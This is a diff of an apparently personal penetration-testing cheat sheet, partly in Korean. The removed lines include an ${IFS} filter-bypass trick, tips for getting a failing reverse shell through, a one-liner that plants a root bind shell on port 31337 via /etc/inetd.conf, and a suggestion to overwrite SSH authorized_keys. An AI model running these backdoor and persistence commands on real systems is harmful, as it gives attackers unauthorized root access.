@@ -28,29 +28,12 @@
 # MOSH(mobile shell)
 <img width="602" height="216" alt="image" src="https://github.com/user-attachments/assets/f1471976-9b5c-49d0-9416-ce866a768be1" />
 
----
-# linux white space 
-```bash
-${IFS}
-```
+
 ---
 # windows ssh file location
 ```powershell
 C:\Users\<Username>\.ssh
 ```
----
-# 리버스 셸 연결이 안될 때
-- nc/bash/python3 등 리버스 연결이 되지 않는다면 elf 파일 혹은 exe 파일을 만들어서 전달해서 실행시켜보기.
-- 리스닝 포트를 well knwon 포트(80,443 등)로 바꿔서 받아보기.
-
----
-# inetd.conf(옛날 리눅스 환경)
-```bash
-echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
-```
-
-- 31337번 포트로 바인드 셸 연결
-
 ---
 # FTP
 - `ls -al`로 숨겨진 파일 확인 가능.
@@ -97,9 +80,6 @@ C:/inetpub/wwwroot
 C:/inetpub/wwwroot/web.config
 C:/inetpub/logs/logfiles
 ```
----
-# SSH
-- authorized_keys를 변경할 수 있으면 변경
 ---
 # Make ODT File(Libre Office)
 - https://github.com/0bfxgh0st/MMG-LO
